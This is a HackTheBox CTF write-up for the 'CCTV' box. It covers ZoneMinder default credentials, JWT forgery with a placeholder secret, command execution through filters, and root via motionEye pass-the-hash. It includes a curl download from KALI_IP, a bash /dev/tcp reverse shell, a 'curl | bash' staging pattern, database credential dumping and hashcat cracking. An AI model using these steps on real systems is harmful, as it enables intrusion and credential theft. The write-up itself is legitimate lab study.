---
title: "CCTV"
date: 2026-03-07
draft: false
tags: ["linux", "web", "easy"]
protected: true
categories: ["writeups"]
summary: ""
params:
  box:
    os: "Linux (Ubuntu 24.04, Apache 2.4.58, OpenSSH 9.6p1)"
    difficulty: "Easy"
ShowToc: true
---

# CCTV — HackTheBox Writeup

CCTV is an Easy Linux box that chains together several real-world security misconfigurations: default credentials in ZoneMinder, a forgotten default JWT secret enabling privilege escalation within the app, and an exposed motionEye instance running as root. What makes this box satisfying is that every step requires you to *understand* the application you're attacking rather than just firing off a CVE exploit.

---

## Overview

The target runs a public-facing ZoneMinder CCTV management interface. Default credentials get us in, but a default JWT signing secret lets us forge tokens for a higher-privileged user, unlocking filter-based command execution. From there, internal service enumeration reveals motionEye running as root on localhost, and its SHA-1 authentication scheme turns out to require no cracking at all — the stored hash *is* the credential.

---

<div id="protected-marker"></div>

## Reconnaissance

### Port Scan

Starting with a standard nmap scan to see what we're working with:

![terminal output](terminal_01.png)

Two ports: SSH and HTTP. The web server immediately redirects to `cctv.htb`, so we add that to `/etc/hosts` and browse over.

### Web Enumeration

The landing page is a marketing site for "SecureVision CCTV & Security Solutions." Nothing interactive — but a "Staff Login" link points to `/zm/`, which is **ZoneMinder**, an open-source CCTV/NVR platform.

The version fingerprints as **1.37.63** (latest at time of writing was 1.38.1). I checked for known CVEs — ZoneMinder had a nasty snapshot injection issue in 2023 (CVE-2023-26035), but that requires an unauthenticated path that's patched here. The views all require authentication.

Before hunting exploits, though: let's try the obvious.

```bash
# Try default credentials
curl -c cookies.txt -b cookies.txt -X POST 'http://cctv.htb/zm/index.php' \
  --data 'action=login&username=admin&password=admin'
```

We're in. Default `admin:admin` credentials work, and the account has a solid set of permissions. Not quite everything, though — we can view system settings but not edit them, and we have no access to Snapshots. That distinction is going to matter shortly.

---

## Foothold

### JWT Forgery for Superadmin

ZoneMinder's API uses JWT tokens for authentication. When I looked at the application config through the API, two things stood out:

1. `ZM_AUTH_HASH_SECRET` was set to the placeholder value: `...Change me to something unique...`
2. `ZM_OPT_USE_LEGACY_API_AUTH=1` was enabled, meaning HS256 JWTs are accepted

With a known signing secret, we can forge a token for *any* user. ZoneMinder has a built-in `superadmin` account with System:Edit and Snapshots:Edit permissions — exactly what we need to unlock filter-based code execution. Let's mint one:

```python
import jwt
import time

payload = {
    "iss": "ZoneMinder",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
    "user": "superadmin",
    "type": "access"
}

secret = "...Change me to something unique..."
token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```

Passing this token as a Bearer header in API requests gives us full superadmin access — confirmed by checking the permissions endpoint.

### Filter Command Execution → www-data Shell

ZoneMinder has a feature called **Filters**: background rules that run against recorded events and can execute arbitrary commands when triggered (`AutoExecuteCmd`). The filter daemon (`zmfilter.pl`) processes these on a cycle, and with superadmin access we can create or modify them.

The workflow is:
1. Modify filter ID=1 (the existing `PurgeWhenFull` filter) to include our command in `AutoExecuteCmd`
2. Create fake events via the API to match the filter's conditions
3. Wait for the daemon cycle (~60 seconds)

One wrinkle: `AutoExecuteCmd` has a 255-character limit. Rather than cramming a reverse shell into that budget, we stage it:

```bash
# Stage 1: write our shell script to /tmp
AutoExecuteCmd = "curl http://KALI_IP:8080/r3.sh -o /tmp/r3.sh"

# Stage 2: execute it
AutoExecuteCmd = "bash /tmp/r3.sh"
```

And `r3.sh` on our server:

```bash
#!/bin/bash
bash -i >& /dev/tcp/KALI_IP/9001 0>&1
```

Saving the filter requires a fresh JWT *and* CSRF token on every request (sessions are single-use with a token param), and the `action` parameter is case-sensitive — it's `SaveAs`, not `save`. I burned some time on that one.

Creating events to trigger the filter:

```bash
curl -X POST "http://cctv.htb/zm/api/events.json" \
  -H "Authorization: Bearer $TOKEN" \
  --data "Event[MonitorId]=0&Event[Name]=trigger&Event[StartDateTime]=2024-01-01 00:00:00&Event[EndDateTime]=2024-01-01 00:01:00&Event[Frames]=1&Event[AlarmFrames]=1&Event[TotScore]=1&Event[AvgScore]=1&Event[MaxScore]=1"
```

After the daemon cycle, we catch a shell as `www-data`.

### Internal Recon from www-data

With a foothold, time to understand the environment. A port scan of localhost reveals a busy internal network:

![terminal output](terminal_02.png)

The ZoneMinder database credentials are in the config (`zmuser:zmpass`), and dumping the users table gives us bcrypt hashes:

```bash
mysql -u zmuser -pzmpass zm -e "SELECT Username,Password FROM Users;"
```

![terminal output](terminal_03.png)

Two Linux users on the system: `mark` (uid 1000) and `sa_mark` (uid 1001). The user flag is almost certainly in `sa_mark`'s home, so let's focus on getting there.

An interesting log file at `/opt/video/backups/server.log` shows `sa_mark` authenticating to the custom API on port 8888 and running `status` and `disk-info` commands every 30–60 seconds. That's worth revisiting later.

---

## Privilege Escalation

### www-data → mark (Hash Cracking)

Mark's bcrypt hash goes to hashcat:

```bash
hashcat -m 3200 -a 0 mark.hash /usr/share/wordlists/rockyou.txt
```

![terminal output](terminal_04.png)

`opensesame`. SSH in as mark:

```bash
sshpass -p 'opensesame' ssh mark@cctv.htb
```

Mark has no sudo access and isn't in the docker group, even though Docker is running on the host. Dead end there. The user flag is in `sa_mark`'s home, which we can't read yet. Time to go after motionEye.

### mark → root (motionEye RCE)

#### Understanding the Auth Model

motionEye stores its admin password as a SHA-1 hash in `/etc/motioneye/camera-1.conf`:

```
@admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```

My first instinct was to crack it against rockyou — no luck. But then I looked at how motionEye actually handles authentication in the browser: the JavaScript client-side code hashes the password with SHA-1 *before* sending it to the server. The server stores and compares hashes directly.

This means the stored hash **is** the credential. We don't need to know what password produces it — we can use the hash itself to authenticate.

motionEye's API uses an HMAC-style signature scheme. Each request is signed with:

```
SHA1("METHOD:path:body:key")
```

where `key` is the admin password hash (the raw SHA-1 string). Let's implement this:

```python
import hashlib
import requests

admin_hash = "989c5a8ee87a0e9521ec81a79187d162109282f0"
base_url = "http://127.0.0.1:8765"

def make_signature(method, path, body=""):
    data = f"{method}:{path}:{body}:{admin_hash}"
    return hashlib.sha1(data.encode()).hexdigest()

def api_get(path):
    sig = make_signature("GET", path)
    resp = requests.get(
        f"{base_url}{path}",
        params={"_username": "admin", "_signature": sig}
    )
    return resp.json()

def api_post(path, payload):
    import json
    body = json.dumps(payload)
    sig = make_signature("POST", path, body)
    resp = requests.post(
        f"{base_url}{path}",
        params={"_username": "admin", "_signature": sig},
        json=payload
    )
    return resp
```

#### Confirming Root Execution

Before writing any shell, check what user motionEye runs as:

```bash
systemctl cat motioneye.service | grep User
# User=root
```

Both motionEye and the motion daemon underneath it run as root. Any command we inject will execute as root.

#### Injecting the Payload

motionEye exposes a camera config endpoint. The `command_notifications_exec` field maps directly to `on_event_start` in motion's camera config — executed whenever motion detects an event (or when we trigger one manually via the webcontrol API on port 7999).

```python
# Get current camera config
config = api_get("/config/1/get/")

# Add our command
config["command_notifications_enabled"] = True
config["command_notifications_exec"] = "cp /root/root.txt /tmp/root.txt && chmod 644 /tmp/root.txt"

# Save it
api_post("/config/1/set/", config)
```

After saving the config, we need to restart the motion daemon so it picks up the change:

```bash
curl "http://127.0.0.1:7999/1/action/restart"
```

Wait a moment for the daemon to come back up, then trigger an event:

```bash
curl "http://127.0.0.1:7999/1/action/eventstart"
```

The `event_gap` setting (default 30 seconds) means motion won't fire `on_event_start` for a new event until 30 seconds after the previous one ended. Account for that in your timing.

Confirm execution:

```bash
cat /tmp/root.txt
```

Root flag obtained. Running the same trick for the user flag in `/home/sa_mark/user.txt` completes the box.

---

## Lessons Learned

**Default secrets are as bad as default passwords.** ZoneMinder ships with a placeholder `ZM_AUTH_HASH_SECRET` and a comment telling you to change it. Nobody did. With a known HMAC secret and a list of valid usernames, JWT forgery is trivial and gives you any privilege level in the application.

**Understand the authentication model before you try to crack hashes.** I wasted time on `hashcat` against the motionEye admin password before realizing the application does client-side SHA-1 hashing. The stored hash *is* the authentication credential — reading the JS source or application docs would have revealed this immediately.

**Application-level RCE often doesn't look like a CVE.** Both the ZoneMinder filter execution and the motionEye event command are *documented features*. The vulnerability is purely in how they're configured (running as root, exposed internally without strong auth).

**Respect daemon timing.** The ZoneMinder filter daemon has a `FILTER_RELOAD_DELAY` of 300 seconds for new filters — modifying an existing one avoids that wait. The motion daemon requires a restart after config changes and enforces an `event_gap` between triggers. These timing details aren't security controls, but ignoring them will make your exploits appear not to work.

**Stage your payloads.** The 255-character limit on `AutoExecuteCmd` is a real constraint. The pattern of `curl <your-server>/<script>.sh | bash` solves it cleanly and also lets you update your payload between attempts without touching the filter config again.
